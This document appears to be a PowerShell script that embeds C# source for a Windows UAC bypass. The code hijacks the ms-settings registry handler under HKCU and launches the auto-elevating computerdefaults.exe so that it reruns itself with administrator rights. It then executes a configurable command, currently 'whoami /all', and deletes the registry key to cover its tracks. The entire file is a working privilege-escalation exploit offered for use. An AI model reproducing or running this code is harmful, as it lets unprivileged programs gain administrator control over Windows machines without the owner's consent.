Add-Type -TypeDefinition @"
using System;
using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Principal;

namespace UAC
{
    public class Program
    {
        
        public static void UAC()
        {
            WindowsPrincipal windowsPrincipal =  new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Warhead("Classes");
                Warhead("Classes\\ms-settings");
                Warhead("Classes\\ms-settings\\shell");
                Warhead("Classes\\ms-settings\\shell\\open");
                RegistryKey registryKey = Warhead("Classes\\ms-settings\\shell\\open\\command");
                string cpath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                registryKey.SetValue("", cpath, RegistryValueKind.String);
                registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
                registryKey.Close();
                try
                {
                     Process.Start(new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        FileName = "cmd.exe",
                        Arguments = "/c start computerdefaults.exe"
                    });
                }
                 catch { }
                Process.GetCurrentProcess().Kill();
            }
            else
            {
                RegistryKey registryKey2 = Warhead("Classes\\ms-settings\\shell\\open\\command");
                registryKey2.SetValue("", "", RegistryValueKind.String);
            }
        }
        public static RegistryKey Warhead(string x)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, true);
            bool flag = !Program.checksubkey(registryKey);
            if (flag)
            {
                registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
            }
            return registryKey;
        }
        public static bool checksubkey(RegistryKey k)
        {
            bool flag = k == null;
            return !flag;
        }
    static class Main_Class
    {
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void Main()
        {
            try
            {
                if (!IsAdministrator())
                {
                    Program.UAC();

                }
                else if (IsAdministrator())
                {

                    string Warhead = "powershell.exe -NoExit -c whoami /all"; // Execute what
                    Process.Start("CMD.exe", "/c start " + Warhead);
                    RegistryKey uac_clean = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
                    uac_clean.DeleteSubKeyTree("shell"); //deleting this is important because if we won't delete that right click of windows will break.
                    uac_clean.Close();
                }

            }
            catch { Environment.Exit(0); }
        }

    }
}
"@